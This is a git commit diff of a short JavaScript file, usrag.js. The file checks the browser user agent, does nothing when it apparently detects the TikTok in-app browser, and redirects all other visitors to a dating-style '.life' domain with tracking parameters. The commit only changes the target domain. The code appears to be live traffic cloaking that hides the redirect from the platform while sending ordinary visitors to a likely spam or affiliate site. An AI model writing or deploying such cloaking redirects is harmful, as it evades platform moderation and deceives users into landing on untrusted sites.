c545898f67a518df73d4cf38f1d3e7f43860ee7d
FixYourSelf1 <72053190+FixYourSelf1@users.noreply.github.com>
2024-06-04 15:01:32 +0300

    Update usrag.js

--- usrag.js
+++ usrag.js
@@ -3,7 +3,7 @@ let agent = navigator.userAgent;
 if (agent.indexOf('music') >= 0) {
   console.log('in tiktok app');
 } else {
-  window.location = 'https://mydatingzone.life/?u=rudktec&o=9kgp9mx';
+  window.location = 'https://lovedreams.life/?u=rudktec&o=9kgp9mx';
 //  window.location = 'https://github.com/FixYourSelf1/watchme';
 }
 // document.querySelector('body').innerText = agent;
